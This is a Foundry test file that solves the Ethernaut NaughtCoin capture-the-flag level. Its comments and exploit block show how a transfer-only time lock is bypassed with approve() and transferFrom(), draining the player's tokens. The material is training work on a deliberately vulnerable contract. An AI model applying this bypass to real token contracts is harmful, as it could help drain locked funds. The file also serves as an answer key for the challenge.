// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public target;

    address public deployer = makeAddr("deployer");
    address public player = makeAddr("player"); // Ethernaut "player" — holds the supply
    address public attacker = player; // you are the player
    address public sink = makeAddr("sink"); // where tokens go

    function setUp() public {
        // Deploy like the Ethernaut instance: player receives the full INITIAL_SUPPLY.
        vm.startPrank(deployer);
        target = new NaughtCoin(player);
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   player balance == 0  (drain all NaughtCoin from the player)
        //
        // Hints (look at NaughtCoin.sol carefully):
        //   - transfer() is locked for `player` until timeLock (~10 years)
        //   - lockTokens only wraps transfer() — NOT approve / transferFrom
        //   - ERC20 still has approve() and transferFrom() from OpenZeppelin
        //   - Classic bypass:
        //       1. player approves some spender (yourself, or another address) for full balance
        //       2. spender calls transferFrom(player, sink, amount)
        //
        // Tip:
        //   uint256 amount = target.balanceOf(player);
        //   target.approve(player, amount);           // or approve(sink / helper)
        //   target.transferFrom(player, sink, amount);
        //
        // Tip: you can also approve a helper contract, then call transferFrom from it.

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        uint256 amount = target.balanceOf(player);
        target.approve(player, amount);
        target.transferFrom(player, sink, amount);
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(target.balanceOf(player), 0, "player should have 0 NaughtCoin");
    }
}
